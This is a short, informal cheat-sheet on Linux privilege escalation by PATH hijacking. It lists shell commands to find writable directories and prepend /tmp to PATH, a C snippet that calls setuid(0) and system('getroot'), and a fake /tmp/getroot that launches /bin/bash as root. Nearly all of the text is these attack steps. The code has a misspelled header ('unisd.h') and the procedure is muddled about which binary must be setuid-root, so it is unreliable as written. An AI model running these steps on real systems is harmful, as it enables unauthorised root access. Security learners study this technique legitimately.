$PATH => is where linux search for the binary files of the command youu write in the terminal

	1. `echo $PATH` => to see the PATH files for your user
	2. `find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u` => to find writable folders and compare them with the PATH file
	3. if you find nothing you can add /tmp to the PATH using `export PATH=/tmp:$PATH`
	4. make a path.c with the command `getroot` using
		`
			#include<unisd.h>
			void main(){
			setuid(0);
			setgid(0);
			system("getroot");
			}
		`	 
	5. compile the file.c using `gcc path.c -o path && chmod u+s path` => to make it a binary file
	6. go to /tmp and write a file with the same name as the command in the file.c => `echo "/bin/bash" > getroot`
	7. once you run the compiled file(path) linx with search for the command getroot and will find it in /tmp/getroot and thats it you are a root now.

[] this is work jjust if the $PATH script runs with root
